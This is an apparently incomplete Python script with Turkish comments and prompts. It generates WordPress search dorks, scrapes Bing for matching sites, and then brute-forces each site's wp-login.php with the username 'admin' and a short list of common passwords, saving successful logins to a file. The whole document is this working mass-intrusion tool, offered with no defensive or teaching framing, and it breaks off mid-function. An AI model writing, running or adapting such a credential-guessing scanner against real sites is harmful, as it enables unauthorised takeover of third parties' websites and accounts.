from random_words import RandomWords
import requests
import urllib.request
import re
from urllib.parse import urlparse as url
rw,dorks_list = RandomWords(),[]
sayi = int(input('[*]Dork için oluşturulacak kelime sayısını girin: '))
kelime = rw.random_words(count=sayi)
dorks = open('dorks.txt', 'w+')
wp_dork = ['("Comment on Hello world!")', '("author/admin")', '("uncategorized")', '("Just another WordPress site")', '("/wp/hello-world/")']
for word in kelime:
    for dork in wp_dork:
        x = dork+word
        print(x)
        #dorks = open('dorks.txt', 'a+')
        dorks.write(x+'\n')
        dorks_list.append(x)
dorks.close()
def urlcek(sayfa=100,urlfile="urller.txt"):
    f=open(urlfile, 'w+')
    links=[]
    #dorks_list = dorks.readlines()
    #sayfa = 100
    for i in range(len(dorks_list)):
        search = dorks_list[i].strip()
        say = 1
        while (say < sayfa):
            req = ('http://www.bing.com/search?q=' + search + '&first='+str(say))
            try:	
                r = requests.get(req)
            except Exception as e:
                print("[*]Bing.com ' a erişemedim:",e)
            req = ''	
            try:
                link = re.findall('<h2><a href="(.+?)"', r.text)
                for i in range(len(link)):
                    if link[i].find('http://bs.yandex.ru'):
                        #f.write(link[i] + '\n')
                        if link[i] not in links:
                            links.append(link[i])
                            print(link[i])
                        
            except Exception as e:
                #print(e)
                pass
            say = say+10
    links=set(links)
    for x in links:
        uri = url(x)
        getURL = lambda y: "{y.scheme}://{y.netloc}".format(y=y)
        yaz = getURL(uri) + '/'
        try:
            print(yaz,end="\n",file=f,flush=True)
        except:
            pass
        #f.write(x + '\n')
    print("Sayı:" ,str(len(links)))
    f.close()
def urloku():
    sifreler = ['admin', 'admin123', '123456', 'admin@123', 'adminadmin', 'letmein', 'password']
    session = requests.Session()
    ac = open("urller.txt", "r").readlines()   
    for url in ac:
        yeni_url = url + 'wp-login.php'
        try:
            r = requests.get(yeni_url)
            if "Username" or "Email" or "Password" or "Remember Me":
                for sifre in sifreler:
                    try:
                        r = session.post(yeni_url, data={"log":"admin","pwd":sifre},timeout=5)
                    except:
                        continue
                    if "Dashboard" in r.text:
                        good = "[+]" + url + "admin:" + sifre
                        print(good)
                        file = open("goods.txt", "a+")
                        file.write(good + "\n")
                        file.close
            else:
                pass
            
        
        
        
    
